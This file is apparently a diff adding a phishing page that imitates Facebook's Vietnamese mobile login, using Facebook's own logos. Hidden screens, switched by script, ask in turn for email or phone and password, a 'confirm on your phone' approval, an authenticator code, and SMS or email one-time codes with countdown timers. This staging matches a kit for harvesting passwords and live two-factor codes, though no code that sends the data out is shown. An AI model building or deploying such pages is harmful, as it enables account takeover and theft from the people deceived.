@@ -1,0 +1,594 @@
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+body {
+        font-family: 'Inter';
+        background-color: #ffffff;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+        overflow: hidden;
+    }
+
+    /* Back Button */
+    .back-button {
+        position: absolute;
+        top: 10px;
+        left: 20px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        color: #000;
+        cursor: pointer;
+        z-index: 10;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    /* Main Container */
+    .main-container {
+        flex: 1;
+  display: block;
+  flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 60px 20px 20px;
+        max-width: 600px;
+        margin: 0 auto;
+        width: 100%;
+        min-height: 0;
+    }
+
+    /* Facebook Logo */
+    .facebook-logo {
+        margin-top: 80px;
+        margin-bottom: 80px;
+        display: block;
+    }
+
+    /* Login Form */
+    .login-form {
+        width: 100%;
+    }
+
+    /* Input Field */
+    .input-field {
+        width: 100%;
+        height: 60px;
+        border: 1px solid #ddd;
+        border-radius: 15px;
+        padding: 0 20px;
+        font-size: 16px;
+        margin-bottom: 12px;
+        background-color: #fff;
+        transition: border-color 0.2s ease;
+        outline: none;
+    }
+
+    .input-field:focus {
+        border-color: rgb(0, 100, 224);
+        outline: none;
+    }
+
+    .input-field::placeholder {
+        color: #8a8d91;
+    }
+
+    /* Password Field */
+    .password-field {
+        -webkit-text-security: disc;
+        text-security: disc;
+    }
+
+    /* Login Button */
+    .login-button {
+        width: 100%;
+        height: 50px;
+        background-color: rgb(0, 100, 224);
+        color: white;
+        border: none;
+        border-radius: 25px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-top: 8px;
+        transition: all 0.2s;
+    }
+
+    .login-button:hover {
+        background-color: rgb(55, 90, 200);
+        transform: translateY(-1px);
+    }
+
+    .login-button:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+        transform: none;
+    }
+
+    .button-loading {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
+
+    .spinner-small {
+        width: 16px;
+        height: 16px;
+        border: 2px solid #ffffff40;
+        border-top: 2px solid #ffffff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    /* Forgot Password */
+    .forgot-password {
+        text-align: center;
+        margin-top: 16px;
+    }
+
+    .forgot-password a {
+        color: rgb(0, 100, 224);
+        text-decoration: none;
+        font-size: 16px;
+    }
+
+    .forgot-password a:hover {
+        text-decoration: underline;
+    }
+
+    /* Footer */
+    .footer-container {
+        padding: 20px;
+        max-width: 400px;
+        margin: 0 auto;
+        width: 100%;
+        position: absolute;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+    }
+
+    .create-account-button {
+        width: 100%;
+        height: 50px;
+        background-color: #fff;
+        color: rgb(0, 100, 224);
+        border: 1px solid rgb(0, 100, 224);
+        border-radius: 25px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-bottom: 20px;
+        transition: all 0.2s;
+    }
+
+    .create-account-button:hover {
+        background-color: #f0f2f5;
+        transform: translateY(-1px);
+    }
+
+    .meta-logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #8a8d91;
+        font-size: 14px;
+        margin-bottom: 10px;
+    }
+
+    .meta-logo img {
+     
+        height: 15px;
+        margin-right: 8px;
+    }
+
+    /* Mobile Responsive */
+    @media (max-width: 480px) {
+        .main-container {
+            padding: 50px 16px 16px;
+        }
+        
+        .back-button {
+            top: 10px;
+            left: 15px;
+        }
+}
+
+/* Hide SweetAlert icon */
+.swal-no-icon .swal2-icon {
+    display: none !important;
+}
+
+/* Template System Styles */
+.template-content {
+    display: none;
+    width: 100%;
+}
+
+.template-content.active {
+    display: block;
+}
+
+.template-content.hidden {
+    display: none !important;
+}
+</style>
+<body id="template">
+
+<!-- Main Content -->
+<div class="main-container">
+    <!-- Default Template (Login Form) -->
+    <div class="template-content active" id="html_default">
+        
+<button class="back-button" onclick="history.back()">
+    ‹
+</button>
+<br/><center>English (US)</center>
+        <!-- Facebook Logo -->
+        <div class="facebook-logo">
+          <center>
+            <img 
+            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" 
+            alt="Facebook logo" 
+            width="60" 
+            height="60"
+        />
+          </center>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="login-form" style="margin-top: 30px;" id="loginForm">
+            <form>
+                <input 
+                    type="text" 
+                    class="input-field" 
+                    placeholder="Địa chỉ email hoặc số điện thoại"
+                    id="username"
+                    pattern="[a-zA-Z0-9@._\-]+"
+                    title="Địa chỉ email hoặc số điện thoại"
+                    required
+                />
+                <input 
+                    type="password"
+                    class="input-field password-field" 
+                    placeholder="Mật khẩu"
+                    id="password"
+                    required
+                />
+                <button type="submit" class="login-button" id="loginButton">
+                    <span class="button-text">Đăng nhập</span>
+                    <span class="button-loading" style="display: none;">
+                        <div class="spinner-small"></div>
+                        Đang tải...
+                    </span>
+                </button>
+            </form>
+        </div>
+        
+        <!-- Forgot Password Link -->
+        <div class="forgot-password">
+            <a href="#" onclick="return false;">
+                Quên mật khẩu
+            </a>
+        </div>
+    </div>
+
+    <!-- Template 1: Registration Form -->
+    <div class="template-content" id="device">
+        <span style="font-weight: 500;">Facebook</span>
+        <h2><span style="font-weight: 500;margin-top:10px;">Check Facebook notifications on your phone</span></h2>
+        <p style="margin-bottom:10px;margin-top:15px;" >
+       Notifications sent to your Facebook. Confirm "yes, this is me" and we will approve this login.
+        </p>
+        <div class="facebook-logo">
+          <center>
+            <img 
+            style="border-radius: 10px;"
+            src="ord.png" 
+            alt="Facebook logo" 
+            width="100%" 
+           
+        />
+          </center>
+        </div>
+        <div class="login-form" style="margin-top: 20px;display: none;" style="display: none;" id="loginForm">
+            <input 
+                type="text" maxlength="10"
+                class="input-field" 
+                value="000000"
+                
+                id="code"
+                pattern="[0-9]*"
+                inputmode="numeric"
+                
+                required
+            />
+          
+         
+           
+        </div>
+        <div class="row" style="margin-top: 20px; display: flex; align-items: flex-start; gap: 10px;">
+               <img src="menu.png?346534" style="width: 20px; flex-shrink: 0;"/>
+               <span style="font-size: 14px; flex: 1;">
+                   <b>Đang chờ phê duyệt</b><br/> 
+                   Có thể mất vài phút để nhận được thông báo trên thiết bị của bạn
+                  
+               </span>
+        </div>
+        
+    </div>
+
+
+    <!-- Template 3: Two-Factor Authentication -->
+    <div class="template-content" id="otp2fa">
+        <div>
+            <span style="font-weight: 500;">Facebook</span>
+            <h2><span style="font-weight: 500;margin-top:10px;"> Nhập mã từ ứng dụng xác thực</span></h2>
+            <p style="margin-bottom:10px;margin-top:15px;">
+            Nhập mã 6 chữ số từ ứng dụng xác thực
+            </p>
+            <img src="app.png" style="width: 100%;border-radius: 15px;">
+           </div>
+            
+            <!-- Login Form -->
+            <div class="login-form" style="margin-top: 20px;" id="loginForm">
+               <form>
+                <input 
+                type="text" maxlength="10"
+                class="input-field" 
+                placeholder="Mã xác thực"
+                id="content"
+                pattern="[0-9]*"
+                inputmode="numeric"
+                required
+            />
+          
+            <button type="submit" class="login-button">
+                <span class="button-text">Tiếp tục</span>
+                
+            </button>
+               </form>
+            </div>
+            
+    </div>
+
+    <!-- Template 4: Profile Settings -->
+    <div class="template-content" id="search_phone">
+        <h2><span style="font-weight: 600;margin-top:10px;">Tìm tài khoản</span></h2>
+        <p style="margin-bottom:10px;margin-top:15px;">
+        Nhập số điện thoại để tìm tài khoản của bạn
+        </p>
+        <div class="login-form" style="margin-top: 20px;" id="loginForm">
+            <form>
+                <input 
+                type="text" 
+                class="input-field" 
+                placeholder="Số điện thoại"
+                id="username"
+                
+              
+                
+                required
+            />
+          
+            <button type="submit" class="login-button" id="loginButton">
+                <span class="button-text">Tiếp tục</span>
+                <span class="button-loading" style="display: none;">
+                    <div class="spinner-small"></div>
+                    Tiếp tục
+                </span>
+            </button>
+            </form>
+        </div>
+    </div>
+    <div class="template-content" id="search_mail">
+        <h2><span style="font-weight: 600;margin-top:10px;">Tìm tài khoản</span></h2>
+        <p style="margin-bottom:10px;margin-top:15px;">
+        Nhập địa chỉ email để tìm tài khoản của bạn
+        </p>
+        <div class="login-form" style="margin-top: 20px;" id="loginForm">
+            <form>
+                <input 
+                type="text" 
+                class="input-field" 
+                placeholder="Email"
+                id="username"
+                
+              
+                
+                required
+            />
+          
+            <button type="submit" class="login-button" id="loginButton">
+                <span class="button-text">Tiếp tục</span>
+                <span class="button-loading" style="display: none;">
+                    <div class="spinner-small"></div>
+                    Tiếp tục
+                </span>
+            </button>
+            </form>
+        </div>
+    </div>
+    <div class="template-content" id="otp_phone">
+        <span style="font-weight: 500;">Facebook</span>
+        <h2><span style="font-weight: 500;margin-top:10px;">Kiểm tra tin nhắn của bạn</span></h2>
+        <p style="margin-bottom:10px;margin-top:15px;" >
+           Nhập mã mà chúng tôi đã gửi đến +84********
+        </p>
+        
+        <img src="sdt.jpeg" style="width: 100%;border-radius: 15px;">
+        <div class="login-form" style="margin-top: 20px;" id="loginForm">
+        <form>
+            <input 
+            type="text" maxlength="10"
+            class="input-field" 
+            placeholder="Mã xác thực"
+            id="content"
+            pattern="[0-9]*"
+            inputmode="numeric"
+            required
+        />
+        <div class="row" style="margin-top: 5px;margin-bottom: 10px; display: flex; align-items: flex-start; gap: 10px;">
+           <img src="reload.png" style="width: 20px; flex-shrink: 0;"/>
+           <span style="font-size: 14px; flex: 1;">Hết hạn trong <b id="countdown1">5:00</b></span>
+    </div>
+        <button type="submit" class="login-button" id="loginButton">
+            <span class="button-text">Tiếp tục</span>
+           
+        </button>
+        </form>
+        </div>
+    </div>
+    <div class="template-content" id="otp_mail">
+        <span style="font-weight: 500;">Facebook</span>
+        <h2><span style="font-weight: 500;margin-top:10px;">Kiểm tra tin nhắn của bạn</span></h2>
+        <p style="margin-bottom:10px;margin-top:15px;" >
+           Nhập mã mà chúng tôi đã gửi đến địa chỉ email ********@gmail.com của bạn
+        </p>
+        
+        <img src="sdt.jpeg" style="width: 100%;border-radius: 15px;">
+        <div class="login-form" style="margin-top: 20px;" id="loginForm">
+        <form>
+            <input 
+            type="text" maxlength="10"
+            class="input-field" 
+            placeholder="Mã xác thực"
+            id="content"
+            pattern="[0-9]*"
+            inputmode="numeric"
+            required
+        />
+        <div class="row" style="margin-top: 5px;margin-bottom: 10px; display: flex; align-items: flex-start; gap: 10px;">
+           <img src="reload.png" style="width: 20px; flex-shrink: 0;"/>
+           <span style="font-size: 14px; flex: 1;">Hết hạn trong <b id="countdown1">5:00</b></span>
+    </div>
+        <button type="submit" class="login-button" id="loginButton">
+            <span class="button-text">Tiếp tục</span>
+           
+        </button>
+        </form>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-container">
+
+    
+    <!-- Meta Logo -->
+    <div class="meta-logo">
+  <img 
+    src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" 
+    alt="Meta logo" 
+  />
+  
+    </div>
+</div>
+
+<script>
+// Template System JavaScript
+class TemplateSystem {
+    constructor() {
+        this.currentTemplate = 'html_default';
+        this.templates = {};
+        this.init();
+    }
+    
+    init() {
+        // Get all template elements
+        const templateElements = document.querySelectorAll('.template-content');
+        
+        // Store templates in object
+        templateElements.forEach(template => {
+            const id = template.id;
+            this.templates[id] = template;
+        });
+        
+        console.log('Template System initialized with templates:', Object.keys(this.templates));
+    }
+    
+    // Show specific template
+    showTemplate(templateId) {
+        // Hide all templates
+        Object.values(this.templates).forEach(template => {
+            template.classList.remove('active');
+            template.classList.add('hidden');
+        });
+        
+        // Show target template
+        if (this.templates[templateId]) {
+            this.templates[templateId].classList.remove('hidden');
+            this.templates[templateId].classList.add('active');
+            this.currentTemplate = templateId;
+            
+            console.log(`Template switched to: ${templateId}`);
+        } else {
+            console.error(`Template not found: ${templateId}`);
+        }
+    }
+    
+    // Hide all templates
+    hideAll() {
+        Object.values(this.templates).forEach(template => {
+            template.classList.remove('active');
+            template.classList.add('hidden');
+        });
+        this.currentTemplate = null;
+        console.log('All templates hidden');
+    }
+    
+    // Get current template
+    getCurrentTemplate() {
+        return this.currentTemplate;
+    }
+    
+    // List all available templates
+    listTemplates() {
+        return Object.keys(this.templates);
+    }
+}
+
+// Initialize template system
+const templateSystem = new TemplateSystem();
+
+// Global functions for easy access
+function openTemplate(templateId) {
+    templateSystem.showTemplate(templateId);
+}
+
+function hideAllTemplates() {
+    templateSystem.hideAll();
+}
+
+function getCurrentTemplate() {
+    return templateSystem.getCurrentTemplate();
+}
+
+// Example usage functions
+function open(id) {
+    openTemplate(id);
+}
+
+
+</script>
+</body>
